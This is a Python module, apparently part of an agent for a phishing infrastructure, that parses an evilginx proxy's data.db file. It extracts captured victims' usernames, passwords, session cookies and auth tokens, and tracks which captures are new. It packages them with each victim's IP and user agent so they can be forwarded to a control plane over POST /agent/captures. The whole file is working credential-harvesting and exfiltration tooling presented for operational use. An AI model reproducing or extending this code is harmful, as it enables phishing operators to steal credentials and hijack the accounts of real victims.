"""Extract captured sessions from an evilginx instance's data.db.

evilginx (buntdb) appends RESP-style records to <config_dir>/data.db. Each write
for a session is a separate record, so the same session_id appears many times.
We parse all records, keep the most recent snapshot per session_id, and expose
only the ones that carry captured data (username / password / auth tokens).

State is persisted per instance+session so we only report a session when it
first gains credentials, and again when its captured cookie tokens change
(creds first, cookies later) - letting the control plane notify immediately on
creds and enrich when the session tokens arrive.

The agent never stores credentials to disk beyond this state; it forwards them
to the control plane via POST /agent/captures.
"""
import json
import logging
from pathlib import Path

logger = logging.getLogger("agent.captures")

STATE_VERSION = 1


def parse_data_db(path) -> list[dict]:
    """Parse a RESP-style evilginx data.db into a list of session dicts."""
    path = Path(path)
    sessions = []
    try:
        lines = path.read_bytes().decode("utf-8", "replace").replace("\r", "").split("\n")
    except OSError as exc:
        logger.debug("cannot read %s: %s", path, exc)
        return sessions
    n = len(lines)
    i = 0
    while i < n:
        line = lines[i]
        if line.startswith("*") and i + 6 < n and lines[i + 1].startswith("$") \
                and lines[i + 2] == "set" and lines[i + 3].startswith("$"):
            key = lines[i + 4] if i + 4 < n else ""
            if key.startswith("sessions:") and key[len("sessions:"):].isdigit():
                val = lines[i + 6] if i + 6 < n else ""
                if val.startswith("{"):
                    try:
                        sessions.append(json.loads(val))
                    except (ValueError, TypeError):
                        pass
            i += 6
        i += 1
    return sessions


def unique_sessions(records: list[dict]) -> list[dict]:
    """Collapse RESP records to the latest snapshot per session_id."""
    best: dict[str, dict] = {}
    for s in records:
        if not isinstance(s, dict) or not s.get("session_id"):
            continue
        sid = s["session_id"]
        cur = best.get(sid)
        if cur is None or (s.get("update_time") or 0) >= (cur.get("update_time") or 0):
            best[sid] = s
    return list(best.values())


def has_capture(s: dict) -> bool:
    """A session counts as a capture once it holds creds or auth tokens."""
    if s.get("username") or s.get("password"):
        return True
    for dom, cks in (s.get("tokens") or {}).items():
        if cks:
            return True
    if s.get("http_tokens") or s.get("body_tokens"):
        return True
    return False


def token_signature(s: dict) -> str:
    """Stable signature of the currently-captured data (for change detection).

    Includes creds so a session is re-reported when a password/username arrives
    after a tokens-only snapshot, and when the token set is enriched.
    """
    return json.dumps({
        "u": s.get("username") or "",
        "p": s.get("password") or "",
        "c": s.get("custom") or {},
        "t": s.get("tokens") or {},
        "h": s.get("http_tokens") or {},
        "b": s.get("body_tokens") or {},
    }, sort_keys=True)


def session_payload(s: dict) -> dict:
    """Raw capture data to forward to the control plane."""
    return {
        "session_id": s.get("session_id"),
        "phishlet": s.get("phishlet"),
        "username": s.get("username"),
        "password": s.get("password"),
        "custom": s.get("custom") or {},
        "body_tokens": s.get("body_tokens") or {},
        "http_tokens": s.get("http_tokens") or {},
        "tokens": s.get("tokens") or {},
        "remote_addr": s.get("remote_addr"),
        "useragent": s.get("useragent"),
        "landing_url": s.get("landing_url"),
        "create_time": s.get("create_time"),
        "update_time": s.get("update_time"),
    }


class CaptureState:
    """Persisted per-instance capture reporting state."""

    def __init__(self, path: str):
        self.path = Path(path)

    def load(self) -> dict:
        if not self.path.exists():
            return {"version": STATE_VERSION, "instances": {}}
        try:
            return json.loads(self.path.read_text())
        except (json.JSONDecodeError, OSError):
            return {"version": STATE_VERSION, "instances": {}}

    def save(self, state: dict):
        self.path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self.path.with_suffix(".tmp")
        tmp.write_text(json.dumps(state, indent=2))
        tmp.replace(self.path)


def drain_captures(config_dir: str, state: dict) -> list[dict]:
    """Return captures to report for one instance, advancing reporting state.

    state is the in-memory CaptureState dict (mutated in place on success of the
    caller's POST; the caller persists it). We return only what is new or
    changed so the control plane gets a fresh cred, then a token enrichment.
    """
    db = Path(config_dir) / "data.db"
    if not db.exists():
        return []
    sessions = unique_sessions(parse_data_db(db))
    inst_key = config_dir
    inst_state = state["instances"].setdefault(inst_key, {})
    to_report = []
    for s in sessions:
        if not has_capture(s):
            continue
        sid = s["session_id"]
        entry = inst_state.get(sid) or {}
        sig = token_signature(s)
        if entry.get("sig") == sig:
            continue
        to_report.append(session_payload(s))
        inst_state[sid] = {
            "sig": sig,
            "reported_creds": bool(entry.get("reported_creds")) or bool(s.get("username") or s.get("password")),
            "reported_at": entry.get("reported_at") or (s.get("update_time") or 0),
        }
    return to_report
